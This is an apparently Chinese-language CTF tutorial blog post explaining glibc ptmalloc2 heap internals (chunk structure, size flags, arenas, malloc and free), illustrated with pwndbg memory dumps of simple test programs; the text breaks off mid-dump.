        <content type="html"><![CDATA[<h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p>堆不同于栈，堆是动态分配的（由操作系统内核或者堆管理器），只有在程序中需要时才会分配。在 CTF 的 pwn 程序中，栈是程序加载进内存后就会出现，而堆是由 malloc、alloc、realloc 函数分配内存后才会出现。<br><strong>其生长方向是正常的从低地址向高地址生长</strong>，栈的高地址向低地址生长就像个异类。堆可以申请到的内存空间比栈要大很多，在 linux 的 4G 的虚拟内存空间里最高可以达到 2.9 G 的空间。<br>对堆的操作是由堆管理器（ptmalloc2）进行的,并不是操作系统。<br><img src="https://s1.ax1x.com/2020/09/07/wu3QoT.png" alt=""><br>堆管理器就像是一个批发商，在malloc分配堆空间时就会向操作系统‘进货‘ 当然就像商人一样进一大批货物（堆空间）这样在程序多次进行malloc申请内存时就不需要频繁的访问操作系统，可以直接向堆管理器进行请求，大量减少了系统调用的开销，提高程序运行性能。<br><img src="https://s1.ax1x.com/2020/09/07/wu3MwV.png" alt=""></p><h3 id="堆的定义与结构"><a href="#堆的定义与结构" class="headerlink" title="堆的定义与结构"></a>堆的定义与结构</h3><p><strong>在程序的执行过程中，我们称由 malloc 申请的内存为 chunk **。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示，当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中。</strong>chunk也就是堆操作的最小执行单元。**</p><p><strong>无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构</strong>，我们来看看它的数据结构定义：</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*  This struct declaration is misleading (but accurate and necessary).  It declares a "view" into memory allowing access to necessary  fields at known offsets from a given base. See explanation below.*/</span><span class="token keyword">struct</span> malloc_chunk <span class="token punctuation">{</span>  INTERNAL_SIZE_T      prev_size<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Size of previous chunk (if free).  */</span>  INTERNAL_SIZE_T      size<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/* Size in bytes, including overhead. */</span>  <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> fd<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">/* double links -- used only if free. */</span>  <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> bk<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Only used for large blocks: pointer to next larger size.  */</span>  <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> fd_nextsize<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* double links -- used only if free. */</span>  <span class="token keyword">struct</span> malloc_chunk<span class="token operator">*</span> bk_nextsize<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>一般来说，size_t 在 <span class="token number">64</span> 位中是 <span class="token number">64</span> 位无符号整数，<span class="token number">32</span> 位中是 <span class="token number">32</span> 位无符号整数。</code></pre><p>字段解释：</p><ul><li><p>prev_size, 如果该 chunk 的物理相邻的前一个chunk是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。这里的前一 chunk 指的是较低地址的 chunk 。</p></li><li><p>size ，该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示</p><ul><li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li><li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。    </li><li>PREV_INUSE，<strong>记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。</strong>当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li></ul></li><li><p>fd，bk。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下</p><ul><li>fd 指向下一个（非物理相邻）空闲的 chunk</li><li>bk 指向上一个（非物理相邻）空闲的 chunk</li><li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li></ul></li><li><p>fd_nextsize， bk_nextsize，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。</p></li></ul><p>其对应结构：Free chunk<br><img src="https://s1.ax1x.com/2020/09/07/wu38W4.png" alt=""><br>Malloced chunk<br><img src="https://s1.ax1x.com/2020/09/07/wu33YF.png" alt=""></p><p>注意事项:<br><strong>32位或64位分配的到的堆分别要4字节对齐，8字节对齐即他们的大小分别是4和8的倍数。</strong><br>在64位中（同32）又因为chunk头是必须要有的所以会占据16字节大小，所以在64位中malloc最小分配到的chunk大小是16字节。<strong>size字段记录了本chunk的完整大小而，chunk大小一定是8的倍数，所以size最后的三bit位没用会被置零（100=4，1000=8）但是设计者为了极值利用每一点空间就把这三位定义了其数据意义（前文所提到的）但是我们主要抓住最后一位带表的意义：前一个chunk是否是free状态，1代表是malloced状态，0代表free状态</strong></p><h2 id="堆的开辟–malloc"><a href="#堆的开辟–malloc" class="headerlink" title="堆的开辟–malloc"></a>堆的开辟–malloc</h2><p>其实除了malloc函数还有realloc，calloc函数也能开辟堆空间，但我们先了解最常用的malloc<br>malloc函数：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">malloc</span><span class="token punctuation">(</span>size_t size<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//在使用malloc的时候要进行强制类型转换为指针类型</span></code></pre><p>malloc函数申请地址成功后返回一个指针，指向大小为至少size字节的内存块，结合上面的结构图即<strong>malloced chunk的user_data_start处的地址作为指针返回，其下方用来存放用户数据，空间大于等于malloc所申请的内存（8字节对齐嘛）</strong><br>回到之前我们所提到的：堆管理器’进货‘，在我们执行malloc之前ptmalloc2就会向系统申请一块较大的内存，来让用户多次申请。举个例子：</p><pre class=" language-java"><code class="language-java"><span class="token operator">*</span>RIP  <span class="token function">0x4004f4</span> <span class="token punctuation">(</span>main<span class="token operator">+</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span>— call   <span class="token number">0x4003f0</span>────────────────────────────────────────────────────────────<span class="token punctuation">[</span> DISASM <span class="token punctuation">]</span>─────────────────────────────────────────────────────────────   <span class="token number">0x4004ef</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span>               mov    edi<span class="token punctuation">,</span> <span class="token number">0x24</span> ► <span class="token number">0x4004f4</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">13</span><span class="token operator">></span>              call   malloc<span class="token annotation punctuation">@plt</span> <span class="token operator">&lt;</span>malloc<span class="token annotation punctuation">@plt</span><span class="token operator">></span>        size<span class="token operator">:</span> <span class="token number">0x24</span>   <span class="token number">0x4004f9</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">18</span><span class="token operator">></span>              mov    qword ptr <span class="token punctuation">[</span>rbp <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rax   <span class="token number">0x4004fd</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">22</span><span class="token operator">></span>              mov    eax<span class="token punctuation">,</span> <span class="token number">0</span>   <span class="token number">0x400502</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">27</span><span class="token operator">></span>              leave     <span class="token number">0x400503</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">28</span><span class="token operator">></span>              ret       <span class="token number">0x400504</span>                        nop    word ptr cs<span class="token operator">:</span><span class="token punctuation">[</span>rax <span class="token operator">+</span> rax<span class="token punctuation">]</span>   <span class="token number">0x40050e</span>                        nop       <span class="token number">0x400510</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span>      push   r15   <span class="token number">0x400512</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">2</span><span class="token operator">></span>    push   r14   <span class="token number">0x400514</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span>    mov    r15<span class="token punctuation">,</span> rdx─────────────────────────────────────────────────────────<span class="token punctuation">[</span> <span class="token function">SOURCE</span> <span class="token punctuation">(</span>CODE<span class="token punctuation">)</span> <span class="token punctuation">]</span>─────────────────────────────────────────────────────────In file<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>hunter<span class="token operator">/</span>how2heap<span class="token operator">/</span>my_heap<span class="token operator">/</span>test<span class="token punctuation">.</span>c   <span class="token number">1</span> #include<span class="token operator">&lt;</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span>   <span class="token number">2</span> #include<span class="token operator">&lt;</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">></span>   <span class="token number">3</span>    <span class="token number">4</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token number">5</span> <span class="token punctuation">{</span> ► <span class="token number">6</span>     <span class="token keyword">void</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">7</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token number">8</span> <span class="token punctuation">}</span>─────────────────────────────────────────────────────────────<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>─────────────────────────</code></pre><p>此时还没执行malloc我们来看看vmmap</p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> vmmapLEGEND<span class="token operator">:</span> STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA          <span class="token number">0x400000</span>           <span class="token number">0x401000</span> r<span class="token operator">-</span>xp     <span class="token number">1000</span> <span class="token number">0</span>      <span class="token operator">/</span>home<span class="token operator">/</span>hunter<span class="token operator">/</span>how2heap<span class="token operator">/</span>my_heap<span class="token operator">/</span>a<span class="token punctuation">.</span>out          <span class="token number">0x600000</span>           <span class="token number">0x601000</span> r<span class="token operator">--</span>p     <span class="token number">1000</span> <span class="token number">0</span>      <span class="token operator">/</span>home<span class="token operator">/</span>hunter<span class="token operator">/</span>how2heap<span class="token operator">/</span>my_heap<span class="token operator">/</span>a<span class="token punctuation">.</span>out          <span class="token number">0x601000</span>           <span class="token number">0x602000</span> rw<span class="token operator">-</span>p     <span class="token number">1000</span> <span class="token number">1000</span>   <span class="token operator">/</span>home<span class="token operator">/</span>hunter<span class="token operator">/</span>how2heap<span class="token operator">/</span>my_heap<span class="token operator">/</span>a<span class="token punctuation">.</span>out    <span class="token number">0x7ffff79e4000</span>     <span class="token number">0x7ffff7bcb000</span> r<span class="token operator">-</span>xp   <span class="token number">1e7000</span> <span class="token number">0</span>      <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7bcb000</span>     <span class="token number">0x7ffff7dcb000</span> <span class="token operator">--</span><span class="token operator">-</span>p   <span class="token number">200000</span> <span class="token number">1e7000</span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7dcb000</span>     <span class="token number">0x7ffff7dcf000</span> r<span class="token operator">--</span>p     <span class="token number">4000</span> <span class="token number">1e7000</span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7dcf000</span>     <span class="token number">0x7ffff7dd1000</span> rw<span class="token operator">-</span>p     <span class="token number">2000</span> 1eb000 <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7dd1000</span>     <span class="token number">0x7ffff7dd5000</span> rw<span class="token operator">-</span>p     <span class="token number">4000</span> <span class="token number">0</span>          <span class="token number">0x7ffff7dd5000</span>     <span class="token number">0x7ffff7dfc000</span> r<span class="token operator">-</span>xp    <span class="token number">27000</span> <span class="token number">0</span>      <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7fdc000</span>     <span class="token number">0x7ffff7fde000</span> rw<span class="token operator">-</span>p     <span class="token number">2000</span> <span class="token number">0</span>          <span class="token number">0x7ffff7ff7000</span>     <span class="token number">0x7ffff7ffa000</span> r<span class="token operator">--</span>p     <span class="token number">3000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>    <span class="token number">0x7ffff7ffa000</span>     <span class="token number">0x7ffff7ffc000</span> r<span class="token operator">-</span>xp     <span class="token number">2000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>    <span class="token number">0x7ffff7ffc000</span>     <span class="token number">0x7ffff7ffd000</span> r<span class="token operator">--</span>p     <span class="token number">1000</span> <span class="token number">27000</span>  <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7ffd000</span>     <span class="token number">0x7ffff7ffe000</span> rw<span class="token operator">-</span>p     <span class="token number">1000</span> <span class="token number">28000</span>  <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7ffe000</span>     <span class="token number">0x7ffff7fff000</span> rw<span class="token operator">-</span>p     <span class="token number">1000</span> <span class="token number">0</span>          <span class="token number">0x7ffffffde000</span>     <span class="token number">0x7ffffffff000</span> rw<span class="token operator">-</span>p    <span class="token number">21000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>stack<span class="token punctuation">]</span><span class="token number">0xffffffffff600000</span> <span class="token number">0xffffffffff601000</span> r<span class="token operator">-</span>xp     <span class="token number">1000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>vsyscall<span class="token punctuation">]</span>pwndbg<span class="token operator">></span> </code></pre><p>还没有出现堆，继续执行</p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> vmmapLEGEND<span class="token operator">:</span> STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA          <span class="token number">0x400000</span>           <span class="token number">0x401000</span> r<span class="token operator">-</span>xp     <span class="token number">1000</span> <span class="token number">0</span>      <span class="token operator">/</span>home<span class="token operator">/</span>hunter<span class="token operator">/</span>how2heap<span class="token operator">/</span>my_heap<span class="token operator">/</span>a<span class="token punctuation">.</span>out          <span class="token number">0x600000</span>           <span class="token number">0x601000</span> r<span class="token operator">--</span>p     <span class="token number">1000</span> <span class="token number">0</span>      <span class="token operator">/</span>home<span class="token operator">/</span>hunter<span class="token operator">/</span>how2heap<span class="token operator">/</span>my_heap<span class="token operator">/</span>a<span class="token punctuation">.</span>out          <span class="token number">0x601000</span>           <span class="token number">0x602000</span> rw<span class="token operator">-</span>p     <span class="token number">1000</span> <span class="token number">1000</span>   <span class="token operator">/</span>home<span class="token operator">/</span>hunter<span class="token operator">/</span>how2heap<span class="token operator">/</span>my_heap<span class="token operator">/</span>a<span class="token punctuation">.</span>out          <span class="token number">0x602000</span>           <span class="token number">0x623000</span> rw<span class="token operator">-</span>p    <span class="token number">21000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>                 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span>堆空间出现    <span class="token number">0x7ffff79e4000</span>     <span class="token number">0x7ffff7bcb000</span> r<span class="token operator">-</span>xp   <span class="token number">1e7000</span> <span class="token number">0</span>      <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7bcb000</span>     <span class="token number">0x7ffff7dcb000</span> <span class="token operator">--</span><span class="token operator">-</span>p   <span class="token number">200000</span> <span class="token number">1e7000</span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7dcb000</span>     <span class="token number">0x7ffff7dcf000</span> r<span class="token operator">--</span>p     <span class="token number">4000</span> <span class="token number">1e7000</span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7dcf000</span>     <span class="token number">0x7ffff7dd1000</span> rw<span class="token operator">-</span>p     <span class="token number">2000</span> 1eb000 <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7dd1000</span>     <span class="token number">0x7ffff7dd5000</span> rw<span class="token operator">-</span>p     <span class="token number">4000</span> <span class="token number">0</span>          <span class="token number">0x7ffff7dd5000</span>     <span class="token number">0x7ffff7dfc000</span> r<span class="token operator">-</span>xp    <span class="token number">27000</span> <span class="token number">0</span>      <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7fdc000</span>     <span class="token number">0x7ffff7fde000</span> rw<span class="token operator">-</span>p     <span class="token number">2000</span> <span class="token number">0</span>          <span class="token number">0x7ffff7ff7000</span>     <span class="token number">0x7ffff7ffa000</span> r<span class="token operator">--</span>p     <span class="token number">3000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>    <span class="token number">0x7ffff7ffa000</span>     <span class="token number">0x7ffff7ffc000</span> r<span class="token operator">-</span>xp     <span class="token number">2000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>    <span class="token number">0x7ffff7ffc000</span>     <span class="token number">0x7ffff7ffd000</span> r<span class="token operator">--</span>p     <span class="token number">1000</span> <span class="token number">27000</span>  <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7ffd000</span>     <span class="token number">0x7ffff7ffe000</span> rw<span class="token operator">-</span>p     <span class="token number">1000</span> <span class="token number">28000</span>  <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7ffe000</span>     <span class="token number">0x7ffff7fff000</span> rw<span class="token operator">-</span>p     <span class="token number">1000</span> <span class="token number">0</span>          <span class="token number">0x7ffffffde000</span>     <span class="token number">0x7ffffffff000</span> rw<span class="token operator">-</span>p    <span class="token number">21000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>stack<span class="token punctuation">]</span><span class="token number">0xffffffffff600000</span> <span class="token number">0xffffffffff601000</span> r<span class="token operator">-</span>xp     <span class="token number">1000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>vsyscall<span class="token punctuation">]</span></code></pre><p>我们主要到堆空间从0x602000           开始，到0x623000 结束，其整个大小为：132KB</p><pre class=" language-java"><code class="language-java"><span class="token operator">>>></span> <span class="token number">0x623000</span> <span class="token operator">-</span><span class="token number">0x602000</span><span class="token number">135168</span><span class="token operator">>>></span> <span class="token number">135168</span><span class="token operator">/</span><span class="token number">1024</span><span class="token number">132</span><span class="token operator">>>></span> </code></pre><p>这就是ptmalloc2商人的货物，是调用了<strong>brk和sbkr函数</strong>，当需求大于132字节就会调用mmap函数来获取一个更大的堆空间。<br>然后每当有malloc函数来向ptmalloc2申请空间时（在bins中没有符合大小的情况下），商人就会从货物中切一块对应大小的chunk，从低地址往高地址切，切了剩下的叫top chunk，原来的那个货物叫arena，由主线程分配的arena叫做main_arena.<br><img src="https://s1.ax1x.com/2020/09/07/wu31FU.png" alt=""></p><h2 id="堆的释放-free"><a href="#堆的释放-free" class="headerlink" title="堆的释放-free"></a>堆的释放-free</h2><p>用一个简单的例子来理解一下 free 函数的实现原理。</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">void</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>gdb：</p><pre class=" language-java"><code class="language-java">──────────────────────────────────────────────────────────────<span class="token punctuation">[</span> <span class="token function">SOURCE</span> <span class="token punctuation">(</span>CODE<span class="token punctuation">)</span> <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────In file<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>matrix<span class="token operator">/</span>test<span class="token punctuation">.</span>c    <span class="token number">3</span>     <span class="token number">4</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token number">5</span> <span class="token punctuation">{</span>    <span class="token number">6</span>     <span class="token keyword">void</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token number">7</span>     <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ►  <span class="token number">8</span>     <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token number">9</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token number">10</span> <span class="token punctuation">}</span>──────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────────<span class="token number">00</span><span class="token operator">:</span><span class="token number">0000</span>│ rsp  <span class="token number">0x7fffffffde90</span> —▸ <span class="token number">0x7fffffffdf80</span> ◂— <span class="token number">0x1</span><span class="token number">01</span><span class="token operator">:</span><span class="token number">0008</span>│      <span class="token number">0x7fffffffde98</span> —▸ <span class="token number">0x602010</span> ◂— <span class="token string">'AAAAAAAB\n'</span>   <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span>输入的字符<span class="token number">02</span><span class="token operator">:</span><span class="token number">0010</span>│ rbp  <span class="token number">0x7fffffffdea0</span> —▸ <span class="token function">0x400600</span> <span class="token punctuation">(</span>__libc_csu_init<span class="token punctuation">)</span> ◂— push   r15<span class="token number">03</span><span class="token operator">:</span><span class="token number">0018</span>│      <span class="token number">0x7fffffffdea8</span> —▸ <span class="token function">0x7ffff7a2d840</span> <span class="token punctuation">(</span>__libc_start_main<span class="token operator">+</span><span class="token number">240</span><span class="token punctuation">)</span> ◂— mov    edi<span class="token punctuation">,</span> eax<span class="token number">04</span><span class="token operator">:</span><span class="token number">0020</span>│      <span class="token number">0x7fffffffdeb0</span> ◂— <span class="token number">0x1</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">0028</span>│      <span class="token number">0x7fffffffdeb8</span> —▸ <span class="token number">0x7fffffffdf88</span> —▸ <span class="token number">0x7fffffffe2f0</span> ◂— <span class="token string">'/home/matrix/a.out'</span><span class="token number">06</span><span class="token operator">:</span><span class="token number">0030</span>│      <span class="token number">0x7fffffffdec0</span> ◂— <span class="token number">0x1f7ffcca0</span><span class="token number">07</span><span class="token operator">:</span><span class="token number">0038</span>│      <span class="token number">0x7fffffffdec8</span> —▸ <span class="token function">0x4005b6</span> <span class="token punctuation">(</span>main<span class="token punctuation">)</span> ◂— push   rbp────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────── ► f <span class="token number">0</span>           <span class="token number">4005e7</span> main<span class="token operator">+</span><span class="token number">49</span>   f <span class="token number">1</span>     7ffff7a2d840 __libc_start_main<span class="token operator">+</span><span class="token number">240</span>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx <span class="token number">0x602010</span> <span class="token operator">-</span><span class="token number">0x10</span>   <span class="token comment" spellcheck="true">//这里-0x10因为malloc返回的是user_data_start地址 </span><span class="token number">0x602000</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span>  <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span>chunk_head<span class="token number">0x602010</span><span class="token operator">:</span>    <span class="token number">0x4241414141414141</span>    <span class="token number">0x000000000000000a</span>  <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span>user_data<span class="token number">0x602020</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x602030</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000020fd1</span>  <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span>top chunk<span class="token number">0x602040</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span></code></pre><p>可以发现size字段是0x31：<strong>首先size的最后三bit有P位是1，然后我申请了0x24字节，为了对齐ptmalloc2给了我0x20的user_data，0x10的chunk_head，显然这里的0x20不足满足我的0x24需求。但是下面的top chunk,</strong><br><strong>的Prev_size字段无意义（因为前一个chunk是malloced）也可以被上一个malloced chunk使用。所以就不在多分配了。所以我们申请得到chunk 大小位0x30但是可以使用下面top chunk的Prev_size。</strong></p><p>继续执行：</p><pre class=" language-java"><code class="language-java">In file<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>matrix<span class="token operator">/</span>test<span class="token punctuation">.</span>c    <span class="token number">4</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token number">5</span> <span class="token punctuation">{</span>    <span class="token number">6</span>     <span class="token keyword">void</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token number">7</span>     <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token number">8</span>     <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span> ►  <span class="token number">9</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token number">10</span> <span class="token punctuation">}</span>──────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────────<span class="token number">00</span><span class="token operator">:</span><span class="token number">0000</span>│ rsp  <span class="token number">0x7fffffffde90</span> —▸ <span class="token number">0x7fffffffdf80</span> ◂— <span class="token number">0x1</span><span class="token number">01</span><span class="token operator">:</span><span class="token 